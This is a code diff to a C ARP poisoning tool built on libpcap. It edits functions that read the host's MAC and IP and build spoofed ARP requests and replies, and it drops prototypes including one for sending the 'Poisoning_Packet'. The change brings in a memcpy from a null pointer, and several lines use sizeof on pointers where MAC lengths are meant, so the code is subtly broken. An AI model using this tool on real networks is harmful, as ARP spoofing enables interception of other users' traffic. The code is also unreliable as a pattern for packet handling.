@@ -41,14 +41,6 @@ typedef struct arp_pkt{
 }arppkt_t;
 #pragma pack(pop)
 
-// 1.Get HostMAC, HostIP 2.Get TargetMAC 3.Send Poisoning_Packet
-void GettingHostMAC(u_char* buffer, char* if_name);
-void GettingHostIP(struct in_addr* hostip, char* if_name);
-void GettingTargetMAC(pcap_t* handle, u_char* tmac, struct in_addr hostip, const u_char* hostmac, struct in_addr tip);
-void CreatingARP_request(u_char* arp_packet, struct in_addr sip, const u_char* smac, struct in_addr tip);
-void CreatingARP_reply(u_char* arp_packet, struct in_addr sip, const u_char* smac, struct in_addr tip, const u_char* tmac);
-void SendingPoisoning_Packet(pcap_t* handle, const u_char* hostmac, const u_char* smac, struct in_addr tip, struct in_addr sip);
-
 
 int main(int argc, char * argv[])
 {
@@ -97,14 +89,14 @@ int main(int argc, char * argv[])
 
 
 //Getting Host Mac
-void GettingHostMAC(u_char* buffer, char* if_name)
+void GettingHostMAC(u_char* buffer, char* something)
 {
     struct ifreq myreq;
     int s, sock;
 
     sock = socket(PF_INET,SOCK_DGRAM,0);
     memset(&myreq, 0x00, sizeof(myreq));
-    strcpy(myreq.ifr_name, if_name);
+    strcpy(myreq.ifr_name, something);
     ioctl(sock, SIOCGIFHWADDR, &myreq);
     close(sock);
 
@@ -113,14 +105,14 @@ void GettingHostMAC(u_char* buffer, char* if_name)
     return;
 }
 //Getting Host IP
-void GettingHostIP(struct in_addr* hostip, char* if_name)
+void GettingHostIP(struct in_addr* hostip, char* something)
 {
     struct ifreq myreq;
     int sock;
 
     sock = socket(AF_INET, SOCK_DGRAM, 0);
     myreq.ifr_addr.sa_family = AF_INET;
-    strncpy(myreq.ifr_name, if_name, IFNAMSIZ-1);
+    strncpy(myreq.ifr_name, something, IFNAMSIZ-1);
     ioctl(sock, SIOCGIFADDR, &myreq);
     close(sock);
     *hostip = ((struct sockaddr_in*)&myreq.ifr_addr)->sin_addr;
@@ -191,9 +183,8 @@ void GettingTargetMAC(pcap_t* handle, u_char* tmac, struct in_addr hostip, const
 
 void CreatingARP_request(u_char* arp_packet, struct in_addr sip, const u_char* smac, struct in_addr tip)
 {
-    ether_t* eth_header=(ether_t*)arp_packet;
+    ether_t* eth_header = (ether_t*)arp_packet;
     arppkt_t* arp_pkt = (arppkt_t*)(arp_packet+SIZE_ETHER_HEADER);
-    u_char emptyMAC[6] = {0,};
 
     memset(eth_header->dst_mac,0xff,6);
     memcpy(eth_header->src_mac,smac,sizeof(smac));
@@ -206,7 +197,8 @@ void CreatingARP_request(u_char* arp_packet, struct in_addr sip, const u_char* s
     arp_pkt->oper = htons(ARPOP_REQUEST);
 
     memcpy(arp_pkt->smac,smac,sizeof(smac));
-    memcpy(arp_pkt->tmac,emptyMAC,sizeof(emptyMAC));
+    memcpy(arp_pkt->tmac,0x00,6);
+
     arp_pkt->sip = sip;
     arp_pkt->tip = tip;
     return;
@@ -214,14 +206,14 @@ void CreatingARP_request(u_char* arp_packet, struct in_addr sip, const u_char* s
 
 void CreatingARP_reply(u_char* arp_packet, struct in_addr sip, const u_char* smac, struct in_addr tip, const u_char* tmac)
 {
-    ether_t* eth_header=(ether_t*)arp_packet;
+    ether_t* eth_header = (ether_t*)arp_packet;
     arppkt_t* arp_pkt = (arppkt_t*)(arp_packet+SIZE_ETHER_HEADER);
 
     memcpy(eth_header->dst_mac,tmac,sizeof(tmac));
     memcpy(eth_header->src_mac,smac,sizeof(smac));
     eth_header->ether_type = htons(ETHERTYPE_ARP);
 
-    arp_pkt->htype=htons(ARPHRD_ETHER);
+    arp_pkt->htype = htons(ARPHRD_ETHER);
     arp_pkt->ptype = htons(ETHERTYPE_IP);
     arp_pkt->hlen = 6;
     arp_pkt->plen = 4;
